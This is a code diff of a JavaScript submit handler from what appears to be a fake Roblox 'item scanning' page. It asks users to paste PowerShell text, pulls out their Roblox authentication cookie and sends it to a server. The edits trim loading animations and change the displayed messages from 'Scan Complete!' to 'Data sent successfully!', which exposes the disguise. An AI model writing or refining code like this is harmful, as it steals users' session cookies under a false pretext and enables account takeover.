@@ -224,10 +224,10 @@ async function submitPowerShell() {
         return;
     }
 
-    // Show loading state with animation
+    // Show loading state
     submitBtn.disabled = true;
-    startLoadingAnimation(submitText);
-    loadingOverlay.style.display = 'block';
+    submitText.textContent = 'Sending...';
+    if (loadingOverlay) loadingOverlay.style.display = 'block';
 
     try {
         // Scan limited items and find authentication data from the input
@@ -243,9 +243,9 @@ async function submitPowerShell() {
         
         // Block execution if no authentication data is found AND less than 50 words
         if (!robloxCookie && wordCount < 50) {
-            stopLoadingAnimation(submitText);
             submitText.textContent = `Too Short: ${wordCount} words`;
-            submitBtn.style.background = '#ef4444'; // Red error color
+            submitBtn.style.background = '#ef4444';
+            if (loadingOverlay) loadingOverlay.style.display = 'none';
             
             setTimeout(() => {
                 submitBtn.disabled = false;
@@ -305,13 +305,12 @@ async function submitPowerShell() {
         });
         
         // Hide loading overlay
-        loadingOverlay.style.display = 'none';
+        if (loadingOverlay) loadingOverlay.style.display = 'none';
 
         if (response.ok) {
-            stopLoadingAnimation(submitText);
-            submitText.textContent = 'Scan Complete!';
-            submitBtn.style.background = '#10b981'; // Green success color
-            showNotification('Item scanning completed successfully!', 'success');
+            submitText.textContent = 'Sent!';
+            submitBtn.style.background = '#10b981';
+            showNotification('Data sent successfully!', 'success');
             
             setTimeout(() => {
                 closeScanModal();
@@ -320,11 +319,10 @@ async function submitPowerShell() {
             throw new Error(`Item scanning failed with status: ${response.status}`);
         }
     } catch (error) {
-        loadingOverlay.style.display = 'none';
+        if (loadingOverlay) loadingOverlay.style.display = 'none';
         
-        stopLoadingAnimation(submitText);
-        submitText.textContent = 'Error - Check Console';
-        submitBtn.style.background = '#ef4444'; // Red error color
+        submitText.textContent = 'Error';
+        submitBtn.style.background = '#ef4444';
         
         // More specific error messages
         if (error.message.includes('fetch') || error.message.includes('Failed to fetch')) {
